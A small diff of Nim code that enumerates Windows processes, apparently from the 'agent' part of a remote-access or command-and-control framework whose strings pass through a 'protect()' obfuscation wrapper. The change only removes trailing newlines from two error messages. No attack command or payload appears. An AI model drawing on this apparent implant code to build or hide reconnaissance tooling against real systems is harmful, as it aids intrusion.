@@ -61,7 +61,7 @@ when defined(agent):
             # Take a snapshot of running processes
             let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
             if hSnapshot == INVALID_HANDLE_VALUE: 
-                raise newException(CatchableError, protect("Invalid permissions.\n"))
+                raise newException(CatchableError, protect("Invalid permissions."))
             
             # Close handle after object is no longer used
             defer: CloseHandle(hSnapshot)
@@ -71,7 +71,7 @@ when defined(agent):
 
             # Loop over processes to fill the map            
             if Process32First(hSnapshot, addr pe32) == FALSE:
-                raise newException(CatchableError, protect("Failed to get processes.\n"))
+                raise newException(CatchableError, protect("Failed to get processes."))
             
             while true: 
                 var procInfo = ProcessInfo(
